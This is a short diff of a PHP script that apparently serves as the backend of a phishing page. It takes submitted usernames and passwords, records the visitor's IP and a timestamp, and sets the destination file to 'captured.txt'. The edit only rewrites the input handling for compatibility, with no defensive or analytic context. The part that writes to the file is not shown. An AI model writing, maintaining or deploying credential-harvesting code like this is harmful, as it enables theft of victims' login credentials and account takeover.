@@ -1,8 +1,8 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $file = 'captured.txt';
-    $username = $_POST["username"] ?? '';
-    $password = $_POST["password"] ?? '';
+    $username = isset($_POST["username"]) ? $_POST["username"] : '';
+    $password = isset($_POST["password"]) ? $_POST["password"] : '';
     $ip = $_SERVER["REMOTE_ADDR"];
     $time = date("Y-m-d H:i:s");
 
